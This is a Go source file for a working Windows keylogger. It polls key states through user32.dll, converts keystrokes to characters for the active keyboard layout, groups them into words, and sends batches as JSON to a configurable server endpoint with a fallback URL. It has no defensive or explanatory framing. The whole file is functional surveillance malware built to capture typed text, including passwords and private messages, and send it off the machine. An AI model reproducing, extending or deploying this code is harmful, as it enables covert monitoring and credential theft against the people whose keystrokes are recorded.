package utils

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32                = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState  = user32.NewProc("GetAsyncKeyState")
	procGetKeyboardLayout = user32.NewProc("GetKeyboardLayout")
	procMapVirtualKeyEx   = user32.NewProc("MapVirtualKeyExW")
	procToUnicodeEx       = user32.NewProc("ToUnicodeEx")
	procGetKeyboardState  = user32.NewProc("GetKeyboardState")
)

// Word boundary characters (keys that indicate end of words)
var WordBoundaries = map[string]bool{
	" ":       true, // Space
	"[Enter]": true,
	"[Tab]":   true,
	",":       true, // Comma
	".":       true, // Period
	"!":       true, // Exclamation
	"?":       true, // Question mark
	";":       true, // Semicolon
	":":       true, // Colon
	"\n":      true, // Newline
	"\t":      true, // Tab
	"\r":      true, // Carriage return
	"-":       true, // Hyphen
	"_":       true, // Underscore
}

// Special key names for logging and readability
var SpecialKeyNames = map[int]string{
	8:   "[Backspace]",
	9:   "[Tab]",
	13:  "[Enter]",
	16:  "[Shift]",
	17:  "[Ctrl]",
	18:  "[Alt]",
	19:  "[Pause]",
	20:  "[Caps Lock]",
	27:  "[Esc]",
	32:  "[Space]",
	33:  "[Page Up]",
	34:  "[Page Down]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	44:  "[Print Screen]",
	45:  "[Insert]",
	46:  "[Delete]",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Menu]",
	144: "[Num Lock]",
	145: "[Scroll Lock]",
	160: "[Shift]",
	161: "[Shift]",
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]",
	165: "[Alt]",
}

// KeystrokeData represents the JSON structure for sending keystrokes
type KeystrokeData struct {
	Keystroke string   `json:"keystroke"`
	Words     []string `json:"words,omitempty"` // Words detected in this keystroke chunk
	Timestamp int64    `json:"timestamp"`
}

// GetActiveKeyboardLayout returns the current keyboard layout handle
func GetActiveKeyboardLayout() uintptr {
	ret, _, _ := procGetKeyboardLayout.Call(0)
	return ret
}

// VirtualKeyToUnicode converts a virtual key code to its Unicode character based on keyboard layout
func VirtualKeyToUnicode(key int, keyboardLayout uintptr) string {
	// Get keyboard state
	var keyboardState [256]byte
	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyboardState)))

	// Convert to scan code
	scanCode, _, _ := procMapVirtualKeyEx.Call(
		uintptr(key),
		0, // MAPVK_VK_TO_VSC
		keyboardLayout,
	)

	// Buffer for the result
	var buffer [5]uint16
	var result string

	// Try to convert to Unicode character
	ret, _, _ := procToUnicodeEx.Call(
		uintptr(key),
		scanCode,
		uintptr(unsafe.Pointer(&keyboardState)),
		uintptr(unsafe.Pointer(&buffer[0])),
		5,
		0,
		keyboardLayout,
	)

	if ret >= 1 {
		result = syscall.UTF16ToString(buffer[:])
	}

	return result
}

func KeyLoggerLoop(serverURL string) {
	fmt.Println("[Keylogger] Starting word-aware keylogger with localization support...")

	if serverURL == "" {
		serverURL = "http://localhost:8080/api/keylog" // Updated default URL
	}

	pressedKeys := make(map[int]bool)
	buffer := ""
	currentWord := ""
	words := []string{}
	lastSendTime := time.Now()

	for {
		time.Sleep(10 * time.Millisecond)

		// Get current keyboard layout
		keyboardLayout := GetActiveKeyboardLayout()

		// Send buffered keystrokes periodically
		if time.Since(lastSendTime) > 500*time.Millisecond && buffer != "" {
			// If we have a current word in progress, add it to the words list
			if currentWord != "" {
				words = append(words, currentWord)
			}

			if success := sendToServer(serverURL, buffer, words); success {
				buffer = ""
				currentWord = ""
				words = []string{}
				lastSendTime = time.Now()
			}
		}

		for key := 8; key <= 255; key++ {
			state, _, _ := procGetAsyncKeyState.Call(uintptr(key))

			// Detect key press (0x8000 flag is set when key is pressed)
			if state&0x8000 != 0 {
				// Only detect the key if it hasn't been pressed yet
				if !pressedKeys[key] {
					pressedKeys[key] = true

					// Get localized key character
					keyStr := getLocalizedKeyString(key, keyboardLayout)
					fmt.Printf("[Keylogger] Key pressed: %d (%s)\n", key, keyStr)

					// Add to buffer
					buffer += keyStr

					// Handle word tracking
					if key == 8 && len(currentWord) > 0 { // Backspace
						// Remove last character from current word
						if len(currentWord) > 0 {
							currentWord = currentWord[:len(currentWord)-1]
						}
					} else if WordBoundaries[keyStr] {
						// We've reached a word boundary
						if currentWord != "" {
							words = append(words, currentWord)
							currentWord = ""
						}
					} else if keyStr != "[Backspace]" && !isControlKey(keyStr) {
						// Add to current word if it's not a control key
						currentWord += keyStr
					}

					// Send immediately if it's a special key or buffer is getting large
					if isWordBoundary(keyStr) || len(buffer) > 20 {
						// If we have a current word in progress, add it to the words list
						if currentWord != "" && isWordBoundary(keyStr) {
							words = append(words, currentWord)
							currentWord = ""
						}

						if success := sendToServer(serverURL, buffer, words); success {
							buffer = ""
							words = []string{}
							lastSendTime = time.Now()
						}
					}
				}
			} else {
				// Detect key release and reset its state
				if pressedKeys[key] {
					pressedKeys[key] = false
				}
			}
		}
	}
}

// Check if a key is a word boundary
func isWordBoundary(key string) bool {
	return WordBoundaries[key]
}

// Check if a key is a control key (like Shift, Ctrl, etc.)
func isControlKey(key string) bool {
	return len(key) > 1 && key[0] == '[' && key[len(key)-1] == ']'
}

func getLocalizedKeyString(key int, keyboardLayout uintptr) string {
	// Handle some special keys for readability
	if name, exists := SpecialKeyNames[key]; exists {
		return name
	}

	// For function keys F1-F12
	if key >= 112 && key <= 123 {
		return fmt.Sprintf("[F%d]", key-111)
	}

	// Try to get localized character based on keyboard layout
	char := VirtualKeyToUnicode(key, keyboardLayout)
	if char != "" {
		return char
	}

	// For numeric keypad
	if key >= 96 && key <= 105 {
		return fmt.Sprintf("%d", key-96)
	}

	// For other keys that couldn't be translated, return the code
	return fmt.Sprintf("[Key:%d]", key)
}

func sendToServer(url string, data string, words []string) bool {
	// Prevent empty data
	if data == "" {
		return true
	}

	// Prepare the JSON data
	keystrokeData := KeystrokeData{
		Keystroke: data,
		Words:     words,
		Timestamp: time.Now().Unix(),
	}

	jsonData, err := json.Marshal(keystrokeData)
	if err != nil {
		fmt.Println("[Keylogger] Failed to marshal JSON:", err)
		return false
	}

	// Create HTTP client with reasonable timeout
	client := &http.Client{
		Timeout: 2 * time.Second,
	}

	// First try POST with JSON
	success := tryPostJSON(client, url, jsonData, data, words)
	if success {
		return true
	}

	// Try alternative endpoint if main one failed
	if !strings.Contains(url, "/api/keylog") {
		fmt.Println("[Keylogger] Trying alternative endpoint...")
		return sendToServer("http://localhost:8080/api/keylog", data, words)
	}

	fmt.Printf("[Keylogger] All methods failed for sending '%s'\n", data)
	return false
}

func tryPostJSON(client *http.Client, url string, jsonData []byte, originalData string, words []string) bool {
	// Create and configure request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("[Keylogger] Failed to create POST request:", err)
		return false
	}

	// Set proper headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Keylogger/1.0")

	// Try the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[Keylogger] POST connection error:", err)
		return false
	}
	defer resp.Body.Close()

	// Read response body for debugging
	body, _ := io.ReadAll(resp.Body)

	// Check for success
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		// Log the successful transmission
		if len(words) > 0 {
			fmt.Printf("[Keylogger] Successfully sent '%s' with %d words to %s (status: %s)\n",
				originalData, len(words), url, resp.Status)
		} else {
			fmt.Printf("[Keylogger] Successfully sent '%s' to %s (status: %s)\n",
				originalData, url, resp.Status)
		}
		return true
	} else {
		fmt.Printf("[Keylogger] Server returned error: %s, Body: %s\n", resp.Status, string(body))
		return false
	}
}
